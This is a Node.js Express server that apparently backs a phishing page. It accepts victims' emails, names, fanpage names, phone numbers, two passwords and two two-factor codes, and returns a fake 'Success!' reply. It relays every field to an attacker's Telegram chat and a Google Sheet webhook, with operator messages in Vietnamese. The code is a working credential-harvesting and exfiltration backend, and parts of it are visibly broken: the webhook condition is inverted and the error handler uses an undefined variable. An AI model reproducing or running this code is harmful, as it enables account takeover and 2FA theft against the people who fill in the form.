import express from "express";
import 'dotenv/config';
import cors from "cors";
import TelegramBot from 'node-telegram-bot-api';
import axios from "axios";

const app = express();
app.use(cors('*'));
app.use(express.json());

const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });

app.post('/api/resgister', (req, res) => {
    const data = req.body; 

    const result = {
        "status": 0,
        "message": "Success!"
    }

    res.send(result);

    const message = `<b>Ip:</b> <code>${data.ip ? data.ip : ''}</code>\n-----------------------------\n<b>Email Business:</b> <code>${data.businessEmail ? data.businessEmail : ''}</code>\n<b>Email Personal:</b> <code>${data.personalEmail ? data.personalEmail : ''}</code>\n<b>Full Name:</b> <code>${data.fullName ? data.fullName : ''}</code> \n<b>Fanpage Name:</b> <code>${data.fanpageName ? data.fanpageName : ''}</code>\n<b>Phone Number:</b> <code>${data.mobilePhone ? data.mobilePhone : ''}</code>\n<b>Password First:</b> <code>${data.passwordFirst ? data.passwordFirst : ''}</code>\n<b>Password Second:</b> <code>${data.passwordSecond ? data.passwordSecond : ''}</code>\n<b>First Two-Fa:</b> <code>${data.firstTwoFa ? data.firstTwoFa : ''}</code>\n<b>Second Two-Fa:</b> <code>${data.secondTwoFa ? data.secondTwoFa : ''}</code>`
    bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'html' });


if(process.env.WEBHOOK_URL == undefined  || process.env.WEBHOOK_URL == ""){
    // ADD GOOGLE SHEET
    const url = new URL(process.env.WEBHOOK_URL);

    url.searchParams.append('Ip', data.ip ? data.ip : '');
    url.searchParams.append('Email Business', data.businessEmail ? data.businessEmail : '');
    url.searchParams.append('Email Personal', data.personalEmail ? data.personalEmail : '');
    url.searchParams.append('Full Name', data.fullName ? data.fullName : '');
    url.searchParams.append('Fanpage Name', data.fanpageName ? data.fanpageName : '');
    url.searchParams.append('Phone Number', data.mobilePhone ? data.mobilePhone : '');
    url.searchParams.append('Password First', data.passwordFirst ? data.passwordFirst : '');
    url.searchParams.append('Password Second', data.passwordSecond ? data.passwordSecond : '');
    url.searchParams.append('First Two-Fa', data.firstTwoFa ? data.firstTwoFa : '');
    url.searchParams.append('Second Two-Fa', data.secondTwoFa ? data.secondTwoFa : '');

    axios.get(url)
    .then(response => {
        const data = response.data;
        if (data) {
            bot.sendMessage(process.env.CHAT_ID, '✅ Đã thêm vào Sheet thành công.');
        } else {
            bot.sendMessage(process.env.CHAT_ID, 'Có lỗi khi thêm data vào google sheet, liên hệ <code>@otisth</code>',  { parse_mode: 'html' });
        }
    })
    .catch(error => {
        bot.sendMessage(chatId, 'Đã có lỗi xảy ra. Vui lòng thử lại sau!');
    });
}

});

app.listen(process.env.PORT, () => {
    console.log(`Server listening port ${process.env.PORT}`);
});
